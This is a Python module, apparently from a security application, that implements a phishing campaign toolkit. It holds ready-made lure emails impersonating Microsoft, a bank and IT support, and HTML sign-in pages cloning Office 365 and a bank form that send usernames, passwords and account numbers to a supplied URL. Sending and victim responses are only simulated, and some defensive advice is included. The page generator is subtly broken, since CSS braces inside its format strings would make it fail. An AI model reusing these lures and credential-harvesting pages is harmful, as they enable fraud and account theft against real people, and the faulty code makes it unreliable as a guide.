# app/core/social_engineering.py
import smtplib
import json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from typing import Dict, List, Optional
from PyQt6.QtCore import QObject, pyqtSignal
from app.core.license_manager import license_manager

class SocialEngineering(QObject):
    """Social engineering toolkit for phishing and credential harvesting"""
    
    se_event = pyqtSignal(str, str, dict)  # event_type, message, data
    
    def __init__(self):
        super().__init__()
        self.campaigns = []
        self.templates = {
            'office365': {
                'subject': 'Office 365 Security Alert - Action Required',
                'body': '''Dear User,

We've detected suspicious activity on your Office 365 account. Please verify your credentials immediately to secure your account.

Click here to verify: {phishing_url}

Microsoft Security Team''',
                'sender': 'security@microsoft-alerts.com'
            },
            'banking': {
                'subject': 'Urgent: Verify Your Account',
                'body': '''Important Security Notice

Your account has been temporarily suspended due to suspicious activity. Please verify your identity immediately.

Verify Account: {phishing_url}

Customer Service Team''',
                'sender': 'alerts@secure-banking.com'
            },
            'it_support': {
                'subject': 'IT Security Update Required',
                'body': '''Hello,

As part of our security upgrade, all users must update their credentials by end of day.

Update Portal: {phishing_url}

IT Support Team''',
                'sender': 'itsupport@company-internal.com'
            }
        }
        
    def create_phishing_campaign(self, campaign_name: str, template: str, 
                                targets: List[str], phishing_url: str) -> Dict:
        """Create phishing email campaign"""
        if not license_manager.is_feature_enabled('social_engineering'):
            return {'error': 'Social Engineering requires Enterprise license'}
            
        if template not in self.templates:
            return {'error': f'Unknown template: {template}'}
            
        campaign = {
            'id': len(self.campaigns) + 1,
            'name': campaign_name,
            'template': template,
            'targets': targets,
            'phishing_url': phishing_url,
            'status': 'created',
            'sent_count': 0,
            'opened_count': 0,
            'clicked_count': 0,
            'credentials_harvested': 0,
            'created_at': self._get_timestamp()
        }
        
        self.campaigns.append(campaign)
        self.se_event.emit('campaign_created', f'Campaign "{campaign_name}" created', campaign)
        
        return {'success': True, 'campaign_id': campaign['id'], 'campaign': campaign}
        
    def send_phishing_emails(self, campaign_id: int, smtp_config: Dict) -> Dict:
        """Send phishing emails (simulation only)"""
        if not license_manager.is_feature_enabled('social_engineering'):
            return {'error': 'Social Engineering requires Enterprise license'}
            
        campaign = self._get_campaign(campaign_id)
        if not campaign:
            return {'error': 'Campaign not found'}
            
        template = self.templates[campaign['template']]
        
        # Simulate email sending
        results = {
            'campaign_id': campaign_id,
            'total_targets': len(campaign['targets']),
            'sent_successfully': 0,
            'failed_sends': 0,
            'delivery_results': []
        }
        
        for target in campaign['targets']:
            # Simulate email delivery
            import random
            success = random.random() > 0.1  # 90% success rate
            
            if success:
                results['sent_successfully'] += 1
                results['delivery_results'].append({
                    'target': target,
                    'status': 'sent',
                    'timestamp': self._get_timestamp()
                })
            else:
                results['failed_sends'] += 1
                results['delivery_results'].append({
                    'target': target,
                    'status': 'failed',
                    'error': 'Invalid email address',
                    'timestamp': self._get_timestamp()
                })
                
        # Update campaign
        campaign['status'] = 'sent'
        campaign['sent_count'] = results['sent_successfully']
        
        self.se_event.emit('emails_sent', f'Sent {results["sent_successfully"]} phishing emails', results)
        
        return results
        
    def simulate_user_interactions(self, campaign_id: int) -> Dict:
        """Simulate user interactions with phishing emails"""
        if not license_manager.is_feature_enabled('social_engineering'):
            return {'error': 'Social Engineering requires Enterprise license'}
            
        campaign = self._get_campaign(campaign_id)
        if not campaign:
            return {'error': 'Campaign not found'}
            
        # Simulate user behavior
        import random
        
        sent_count = campaign['sent_count']
        if sent_count == 0:
            return {'error': 'No emails sent yet'}
            
        # Realistic interaction rates
        open_rate = 0.25  # 25% open rate
        click_rate = 0.08  # 8% click rate
        credential_rate = 0.03  # 3% credential submission rate
        
        opened = int(sent_count * open_rate * random.uniform(0.8, 1.2))
        clicked = int(opened * (click_rate / open_rate) * random.uniform(0.7, 1.3))
        credentials = int(clicked * (credential_rate / click_rate) * random.uniform(0.5, 1.5))
        
        # Update campaign stats
        campaign['opened_count'] = opened
        campaign['clicked_count'] = clicked
        campaign['credentials_harvested'] = credentials
        
        results = {
            'campaign_id': campaign_id,
            'emails_sent': sent_count,
            'emails_opened': opened,
            'links_clicked': clicked,
            'credentials_harvested': credentials,
            'open_rate': f"{(opened/sent_count)*100:.1f}%",
            'click_rate': f"{(clicked/sent_count)*100:.1f}%",
            'credential_rate': f"{(credentials/sent_count)*100:.1f}%"
        }
        
        self.se_event.emit('interactions_updated', f'Campaign stats updated', results)
        
        return results
        
    def generate_phishing_page(self, template: str, target_url: str) -> Dict:
        """Generate phishing page HTML"""
        if not license_manager.is_feature_enabled('social_engineering'):
            return {'error': 'Social Engineering requires Enterprise license'}
            
        templates = {
            'office365': '''
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Office 365 - Sign In</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f3f2f1; }
        .container { max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; }
        .btn { background: #0078d4; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><h2>Microsoft</h2></div>
        <form action="{target_url}" method="post">
            <div class="form-group">
                <input type="email" name="email" placeholder="Email" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="btn">Sign In</button>
        </form>
    </div>
</body>
</html>''',
            'banking': '''
<!DOCTYPE html>
<html>
<head>
    <title>Secure Banking - Account Verification</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1e3a8a; color: white; }
        .container { max-width: 500px; margin: 80px auto; background: white; color: black; padding: 40px; border-radius: 8px; }
        .header { text-align: center; margin-bottom: 30px; color: #1e3a8a; }
        .form-group { margin-bottom: 20px; }
        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; }
        .btn { background: #1e3a8a; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><h2>🏦 Secure Banking</h2></div>
        <p><strong>Account Verification Required</strong></p>
        <form action="{target_url}" method="post">
            <div class="form-group">
                <input type="text" name="username" placeholder="Username" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <div class="form-group">
                <input type="text" name="account" placeholder="Account Number" required>
            </div>
            <button type="submit" class="btn">Verify Account</button>
        </form>
    </div>
</body>
</html>'''
        }
        
        if template not in templates:
            return {'error': f'Unknown template: {template}'}
            
        html_content = templates[template].format(target_url=target_url)
        
        return {
            'success': True,
            'template': template,
            'html_content': html_content,
            'target_url': target_url
        }
        
    def analyze_campaign_effectiveness(self, campaign_id: int) -> Dict:
        """Analyze campaign effectiveness and provide recommendations"""
        if not license_manager.is_feature_enabled('social_engineering'):
            return {'error': 'Social Engineering requires Enterprise license'}
            
        campaign = self._get_campaign(campaign_id)
        if not campaign:
            return {'error': 'Campaign not found'}
            
        sent = campaign['sent_count']
        opened = campaign['opened_count']
        clicked = campaign['clicked_count']
        credentials = campaign['credentials_harvested']
        
        if sent == 0:
            return {'error': 'No emails sent yet'}
            
        analysis = {
            'campaign_name': campaign['name'],
            'template_used': campaign['template'],
            'metrics': {
                'emails_sent': sent,
                'open_rate': (opened / sent) * 100,
                'click_rate': (clicked / sent) * 100,
                'credential_rate': (credentials / sent) * 100
            },
            'effectiveness': self._calculate_effectiveness(opened, clicked, credentials, sent),
            'recommendations': self._generate_recommendations(campaign),
            'risk_assessment': self._assess_security_risk(clicked, credentials, sent)
        }
        
        return analysis
        
    def _get_campaign(self, campaign_id: int) -> Optional[Dict]:
        """Get campaign by ID"""
        for campaign in self.campaigns:
            if campaign['id'] == campaign_id:
                return campaign
        return None
        
    def _calculate_effectiveness(self, opened: int, clicked: int, credentials: int, sent: int) -> str:
        """Calculate campaign effectiveness"""
        if sent == 0:
            return 'No Data'
            
        credential_rate = (credentials / sent) * 100
        
        if credential_rate >= 5:
            return 'Highly Effective'
        elif credential_rate >= 2:
            return 'Effective'
        elif credential_rate >= 0.5:
            return 'Moderately Effective'
        else:
            return 'Low Effectiveness'
            
    def _generate_recommendations(self, campaign: Dict) -> List[str]:
        """Generate improvement recommendations"""
        recommendations = [
            'Implement security awareness training',
            'Deploy email security filters',
            'Enable multi-factor authentication',
            'Regular phishing simulation exercises'
        ]
        
        template = campaign['template']
        if template == 'office365':
            recommendations.append('Train users on Microsoft security indicators')
        elif template == 'banking':
            recommendations.append('Educate users about banking security practices')
            
        return recommendations
        
    def _assess_security_risk(self, clicked: int, credentials: int, sent: int) -> Dict:
        """Assess organizational security risk"""
        if sent == 0:
            return {'level': 'Unknown', 'score': 0}
            
        click_rate = (clicked / sent) * 100
        credential_rate = (credentials / sent) * 100
        
        if credential_rate >= 5 or click_rate >= 15:
            risk_level = 'Critical'
            risk_score = 9
        elif credential_rate >= 2 or click_rate >= 10:
            risk_level = 'High'
            risk_score = 7
        elif credential_rate >= 0.5 or click_rate >= 5:
            risk_level = 'Medium'
            risk_score = 5
        else:
            risk_level = 'Low'
            risk_score = 3
            
        return {
            'level': risk_level,
            'score': risk_score,
            'description': f'Organization shows {risk_level.lower()} susceptibility to phishing attacks'
        }
        
    def get_campaign_summary(self) -> Dict:
        """Get summary of all campaigns"""
        if not self.campaigns:
            return {'total_campaigns': 0, 'campaigns': []}
            
        summary = {
            'total_campaigns': len(self.campaigns),
            'total_emails_sent': sum(c['sent_count'] for c in self.campaigns),
            'total_credentials_harvested': sum(c['credentials_harvested'] for c in self.campaigns),
            'campaigns': []
        }
        
        for campaign in self.campaigns:
            summary['campaigns'].append({
                'id': campaign['id'],
                'name': campaign['name'],
                'template': campaign['template'],
                'status': campaign['status'],
                'targets': len(campaign['targets']),
                'effectiveness': self._calculate_effectiveness(
                    campaign['opened_count'], 
                    campaign['clicked_count'], 
                    campaign['credentials_harvested'], 
                    campaign['sent_count']
                )
            })
            
        return summary
        
    def _get_timestamp(self) -> str:
        """Get current timestamp"""
        from datetime import datetime
        return datetime.now().isoformat()

# Global social engineering instance
social_engineering = SocialEngineering()